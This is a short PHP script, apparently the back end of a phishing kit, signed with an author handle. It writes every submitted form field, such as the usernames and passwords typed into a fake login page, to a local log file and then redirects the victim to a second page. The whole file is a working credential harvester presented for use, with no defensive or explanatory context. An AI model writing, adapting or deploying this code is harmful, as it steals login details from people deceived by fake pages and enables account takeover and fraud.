<?php
//@Savage_k
header
('location:');
$handle=fopen("Logresult.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location: index2.html");
exit;
//@Savage_k
?>
